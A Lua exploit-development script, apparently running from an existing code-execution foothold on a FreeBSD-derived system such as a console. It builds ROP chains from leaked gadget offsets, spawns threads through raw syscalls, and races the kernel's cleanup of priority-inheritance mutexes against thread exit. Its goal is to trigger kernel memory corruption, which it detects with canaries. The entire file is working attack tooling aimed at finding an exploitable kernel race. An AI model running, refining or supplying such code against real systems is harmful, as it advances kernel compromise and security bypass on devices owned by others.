-- CRASH_CLASS: HIGH
-- PROBE 97a: Thread exit vs UMTX PI cleanup race
--
-- When a thread exits holding a PI mutex, the kernel runs
-- umtx_thread_cleanup() → nulls pi_owner, removes contest list
-- entries. If other threads simultaneously acquire the same
-- mutex (via TRYLOCK after we clear m_owner in userland), the
-- PI structure manipulation races.
--
-- A) Gate: what happens to a PI mutex when its owner thr_exits?
-- B) TRYLOCK spin race: clear m_owner trick while owner exits
-- C) Blocking LOCK + force MTX_WAKE during exit cleanup
-- D) Rapid exit-with-lock cycling

print("=== PROBE 97a: EXIT vs UMTX RACE ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
if not SA then print("NO syscall_address") return end
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local mm=mk(477); local tc=mk(430); local c624=mk(624)
local sc_umtx=mk(454)

local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))
print("gadgets OK")

local _DI=0x048; local _SI=0x050; local _DX=0x058
local _R10=0x060; local _R8=0x068; local _AX=0x078
local _CS=0x0C0; local _FL=0x0D0; local _IP=0x0E0
local _SP=0x0F8; local _SS=0x100; local _MG=0x108; local _TP=0x110

local function vmc()
    local ok,c=pcall(function() return c624(uint64(0),uint64(0),uint64(0)) end)
    return ok and N(c) or -1
end

local MAX_CH=60
local STK_PG=1
local PG_PER_CHILD=STK_PG+1
local TOTAL_PG=2+MAX_CH*PG_PER_CHILD
print(string.format("ch=%d pg=%d", MAX_CH, TOTAL_PG))

local ok_m,region=pcall(function()
    return mm(uint64(0),uint64(TOTAL_PG*0x4000),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_m then print("MMAP FAIL") return end
local R=N(region)
print(string.format("region=0x%X",R))

-- Timespecs
local ts999=R; wq(ts999,uint64(999)); wq(ts999+8,uint64(0))
local ts1ms=R+0x20; wq(ts1ms,uint64(0)); wq(ts1ms+8,uint64(1000000))
local ts5ms=R+0x40; wq(ts5ms,uint64(0)); wq(ts5ms+8,uint64(5000000))
local ts50ms=R+0x60; wq(ts50ms,uint64(0)); wq(ts50ms+8,uint64(50000000))
local ts2ms=R+0x80; wq(ts2ms,uint64(0)); wq(ts2ms+8,uint64(2000000))
local tb=R+0xA0
local exit_flag=R+0xC0

-- PI mutex
local pi_mtx=R+0x200
-- Canary area
local canary_area=R+0x300

local cidx=0
local function child_stk(i) return R+0x4000*(2+i*PG_PER_CHILD) end
local function child_ctx(i) return R+0x4000*(2+i*PG_PER_CHILD+STK_PG) end

local function set_ctx(ctx, rip, rsp, rax, rdi, rsi, rdx, r10, r8)
    z(ctx, 0x200)
    wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,rip); wq(ctx+_SP,rsp)
    wq(ctx+_AX,uint64(rax))
    wq(ctx+_DI,uint64(rdi)); wq(ctx+_SI,uint64(rsi))
    wq(ctx+_DX,uint64(rdx)); wq(ctx+_R10,uint64(r10))
    wq(ctx+_R8,uint64(r8))
end

local function spawn(rax, rdi, rsi, rdx, r10, r8, rop_fn)
    if cidx>=MAX_CH then return nil end
    local si=cidx; cidx=cidx+1
    local stk=child_stk(si)
    local ctx=child_ctx(si)
    local off=0
    if rop_fn then off=rop_fn(stk) end
    -- nanosleep tail
    wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(ts999)); off=off+8
    wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(0)); off=off+8
    wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(240)); off=off+8
    wq(stk+off,SA); off=off+8
    set_ctx(ctx, SA, uint64(stk), rax, rdi, rsi, rdx, r10, r8)
    wq(tb,uint64(0))
    pcall(function() tc(uint64(ctx),uint64(tb),uint64(0)) end)
    return rq(tb)
end

-- ============================================================
-- A: GATE — what happens when PI mutex owner thr_exits?
-- ============================================================
print("--- A: EXIT-WITH-LOCK BEHAVIOR ---")

z(pi_mtx, 0x20)
wd(pi_mtx, 0)     -- unlocked
wd(pi_mtx+4, 4)   -- PRIO_INHERIT

-- Child A: lock PI mutex → thr_exit(exit_flag)
wq(exit_flag, uint64(0))
local tidA=spawn(454, pi_mtx, 5, 0, 0, 0, function(stk)
    local off=0
    -- After lock: thr_exit(exit_flag)
    wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(exit_flag)); off=off+8
    wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(431)); off=off+8
    wq(stk+off,SA); off=off+8
    return off
end)
local tidA_n=tidA and N(tidA) or 0
print(string.format("child A TID=0x%X", tidA_n))

-- Wait for exit
native.fcall_with_rax(stub,240,ts50ms,0)

local fl=rd(exit_flag) or 0
local mo=rd(pi_mtx) or 0
if mo<0 then mo=mo+0x100000000 end
local c=N(native.fcall_with_rax(stub,20))
print(string.format("exit_flag=%d m_owner=0x%X canary=%d %s",
    fl, mo, c, c==pid and "OK" or "!!"))

-- What's left in m_owner?
local owner_dead=(mo>=0x80000000)
local owner_tid=mo % 0x80000000
print(string.format("  OWNER_DEAD=%s owner_tid=0x%X (A was 0x%X)",
    tostring(owner_dead), owner_tid, tidA_n))

-- Try TRYLOCK from main
local ok_tl,rv_tl=pcall(function()
    return sc_umtx(uint64(pi_mtx),uint64(4),uint64(0),uint64(0),uint64(0))
end)
local mo2=rd(pi_mtx) or 0
if mo2<0 then mo2=mo2+0x100000000 end
print(string.format("TRYLOCK: rv=%s m_owner=0x%X",
    ok_tl and tostring(N(rv_tl)) or "FAIL", mo2))

-- If trylock succeeded, unlock
if ok_tl and N(rv_tl)==0 then
    pcall(function()
        sc_umtx(uint64(pi_mtx),uint64(6),uint64(0),uint64(0),uint64(0))
    end)
    print("(unlocked)")
end

-- Try manual clear + lock
wd(pi_mtx, 0)
local ok_lk,rv_lk=pcall(function()
    return sc_umtx(uint64(pi_mtx),uint64(4),uint64(0),uint64(0),uint64(0))
end)
local mo3=rd(pi_mtx) or 0
if mo3<0 then mo3=mo3+0x100000000 end
print(string.format("clear+TRYLOCK: rv=%s m_owner=0x%X",
    ok_lk and tostring(N(rv_lk)) or "FAIL", mo3))
if ok_lk and N(rv_lk)==0 then
    pcall(function()
        sc_umtx(uint64(pi_mtx),uint64(6),uint64(0),uint64(0),uint64(0))
    end)
end

-- ============================================================
-- B: TRYLOCK SPIN RACE — clear m_owner trick during exit
-- ============================================================
print("")
print("--- B: TRYLOCK SPIN RACE ---")

local hits_b=0
for round=1,8 do
    if cidx>=MAX_CH-9 then print("B: LIMIT at ch="..cidx) break end

    z(pi_mtx, 0x20)
    wd(pi_mtx, 0); wd(pi_mtx+4, 4)  -- fresh PI mutex
    wq(exit_flag, uint64(0))

    -- Write canary pattern
    for i=0,7 do wd(canary_area+i*4, 0xDEAD0000+round) end

    local vm0=vmc()

    -- Child A: lock → 5ms sleep → thr_exit
    spawn(454, pi_mtx, 5, 0, 0, 0, function(stk)
        local off=0
        -- nanosleep(5ms)
        wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(ts5ms)); off=off+8
        wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(0)); off=off+8
        wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(240)); off=off+8
        wq(stk+off,SA); off=off+8
        -- thr_exit(exit_flag)
        wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(exit_flag)); off=off+8
        wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(431)); off=off+8
        wq(stk+off,SA); off=off+8
        return off
    end)

    -- Children B-H: TRYLOCK/UNLOCK spin (8 spinners)
    for i=1,8 do
        spawn(454, pi_mtx, 4, 0, 0, 0, function(stk)
            local off=0
            local cycles=math.floor((STK_PG*0x4000-200)/80)
            for j=1,cycles do
                -- UNLOCK (harmless if not owner)
                wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(6)); off=off+8
                wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(454)); off=off+8
                wq(stk+off,SA); off=off+8
                -- TRYLOCK
                wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(4)); off=off+8
                wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(454)); off=off+8
                wq(stk+off,SA); off=off+8
            end
            return off
        end)
    end

    -- Wait 2ms then clear m_owner (trick: let spinners acquire)
    native.fcall_with_rax(stub,240,ts2ms,0)
    wd(pi_mtx, 0)  -- clear m_owner → spinners see mutex as free

    -- Wait for A to exit (5ms total from A's spawn)
    native.fcall_with_rax(stub,240,ts50ms,0)

    local vm1=vmc()
    local fl=rd(exit_flag) or 0
    local mo=rd(pi_mtx) or 0
    if mo<0 then mo=mo+0x100000000 end
    local c=N(native.fcall_with_rax(stub,20))

    -- Check canary area
    local canary_ok=true
    for i=0,7 do
        local cv=rd(canary_area+i*4) or 0
        if cv<0 then cv=cv+0x100000000 end
        if cv~=0xDEAD0000+round then canary_ok=false end
    end

    local tag=""
    if c~=pid then hits_b=hits_b+1; tag=" !!CANARY" end
    if not canary_ok then tag=tag.." !!MEM_CORRUPT" end
    if mo>=0x80000000 then tag=tag.." OWNER_DEAD" end

    print(string.format("B%d: flag=%d mo=0x%X vmd=%d can=%d mem=%s%s",
        round, fl, mo, vm1-vm0, c, canary_ok and "ok" or "BAD", tag))
end
print("B hits="..hits_b)

-- ============================================================
-- C: BLOCKING LOCK + MTX_WAKE during exit cleanup
-- ============================================================
print("")
print("--- C: LOCK + MTX_WAKE RACE ---")

local hits_c=0
for round=1,5 do
    if cidx>=MAX_CH-5 then print("C: LIMIT at ch="..cidx) break end

    z(pi_mtx, 0x20)
    wd(pi_mtx, 0); wd(pi_mtx+4, 4)
    wq(exit_flag, uint64(0))
    for i=0,7 do wd(canary_area+i*4, 0xBEEF0000+round) end

    local vm0=vmc()

    -- Child A: lock → 5ms → thr_exit
    spawn(454, pi_mtx, 5, 0, 0, 0, function(stk)
        local off=0
        wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(ts5ms)); off=off+8
        wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(0)); off=off+8
        wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(240)); off=off+8
        wq(stk+off,SA); off=off+8
        wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(exit_flag)); off=off+8
        wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(431)); off=off+8
        wq(stk+off,SA); off=off+8
        return off
    end)

    -- Children B-E: blocking LOCK (will queue as PI waiters)
    -- After lock: unlock → nanosleep (handled by tail)
    for i=1,4 do
        spawn(454, pi_mtx, 5, 0, 0, 0, function(stk)
            local off=0
            -- If we wake up from LOCK, unlock and sleep
            wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(6)); off=off+8
            wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(454)); off=off+8
            wq(stk+off,SA); off=off+8
            return off
        end)
    end

    -- Wait 3ms — children should be queued as waiters by now
    native.fcall_with_rax(stub,240,ts2ms,0)
    native.fcall_with_rax(stub,240,ts1ms,0)

    -- Clear m_owner AND do MTX_WAKE to jolt waiters during cleanup
    wd(pi_mtx, 0)
    pcall(function()
        sc_umtx(uint64(pi_mtx),uint64(18),uint64(0x7FFFFFFF),uint64(0),uint64(0))
    end)

    -- Wait for A to exit and dust to settle
    native.fcall_with_rax(stub,240,ts50ms,0)

    local vm1=vmc()
    local fl=rd(exit_flag) or 0
    local mo=rd(pi_mtx) or 0
    if mo<0 then mo=mo+0x100000000 end
    local c=N(native.fcall_with_rax(stub,20))

    local canary_ok=true
    for i=0,7 do
        local cv=rd(canary_area+i*4) or 0
        if cv<0 then cv=cv+0x100000000 end
        if cv~=0xBEEF0000+round then canary_ok=false end
    end

    local tag=""
    if c~=pid then hits_c=hits_c+1; tag=" !!CANARY" end
    if not canary_ok then tag=tag.." !!MEM_CORRUPT" end

    print(string.format("C%d: flag=%d mo=0x%X vmd=%d can=%d mem=%s%s",
        round, fl, mo, vm1-vm0, c, canary_ok and "ok" or "BAD", tag))
end
print("C hits="..hits_c)

-- ============================================================
-- D: RAPID EXIT CYCLING — many lock+exit in sequence
-- ============================================================
print("")
print("--- D: RAPID EXIT CYCLING ---")

if cidx<MAX_CH-10 then
    z(pi_mtx, 0x20)
    wd(pi_mtx, 0); wd(pi_mtx+4, 4)

    -- Spawn 4 spinners first
    for i=1,4 do
        spawn(454, pi_mtx, 4, 0, 0, 0, function(stk)
            local off=0
            local cycles=math.floor((STK_PG*0x4000-200)/80)
            for j=1,cycles do
                wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(6)); off=off+8
                wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(454)); off=off+8
                wq(stk+off,SA); off=off+8
                wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(4)); off=off+8
                wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(454)); off=off+8
                wq(stk+off,SA); off=off+8
            end
            return off
        end)
    end

    local vm0=vmc()
    local ok_count=0

    -- Rapidly spawn lock+exit children, clearing m_owner between each
    for i=1,6 do
        if cidx>=MAX_CH then break end
        wd(pi_mtx, 0)  -- clear for next locker
        wq(exit_flag, uint64(0))

        spawn(454, pi_mtx, 5, 0, 0, 0, function(stk)
            local off=0
            wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(exit_flag)); off=off+8
            wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(431)); off=off+8
            wq(stk+off,SA); off=off+8
            return off
        end)

        -- Tiny delay between spawns
        native.fcall_with_rax(stub,240,ts1ms,0)

        local fl=rd(exit_flag) or 0
        local c=N(native.fcall_with_rax(stub,20))
        if c==pid then ok_count=ok_count+1 end
        if c~=pid then
            print(string.format("D: CRASH at i=%d!", i))
            break
        end
    end

    native.fcall_with_rax(stub,240,ts50ms,0)

    local vm1=vmc()
    local mo=rd(pi_mtx) or 0
    if mo<0 then mo=mo+0x100000000 end
    local c=N(native.fcall_with_rax(stub,20))
    print(string.format("D: %d/6 ok mo=0x%X vmd=%d can=%d %s",
        ok_count, mo, vm1-vm0, c, c==pid and "OK" or "!!CANARY"))
else
    print("D: SKIP (child limit)")
end

-- ============================================================
print("")
print(string.format("SUMMARY: B=%d C=%d ch=%d", hits_b, hits_c, cidx))
print("final canary="..N(native.fcall_with_rax(stub,20)))
print("=== 97a COMPLETE ===")
